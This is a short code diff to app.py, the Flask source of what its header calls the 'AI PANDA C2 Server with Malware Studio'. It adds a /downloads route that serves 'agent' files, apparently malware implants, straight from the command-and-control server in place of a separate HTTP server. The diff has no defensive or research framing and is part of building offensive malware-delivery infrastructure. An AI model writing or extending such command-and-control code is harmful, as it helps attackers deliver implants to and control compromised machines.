@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 # app.py - AI PANDA C2 Server with Malware Studio
 
-from flask import Flask, request, jsonify, render_template, redirect, url_for, session
+from flask import Flask, request, jsonify, render_template, redirect, url_for, session, send_from_directory
 import os
 import json
 import uuid
@@ -1587,6 +1587,13 @@ def post_results():
     except Exception as e:
         logger.error(f"Error in post_results: {traceback.format_exc()}")
         return jsonify({"status": "error", "message": str(e)}), 500
+
+@app.route('/downloads/<path:filename>')
+def serve_download(filename):
+    """Serve agent files for download — replaces the need for a separate http.server on :8000."""
+    agents_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'agents')
+    return send_from_directory(os.path.abspath(agents_dir), filename)
+
 
 @app.route('/create_task', methods=['POST'])
 def create_task():
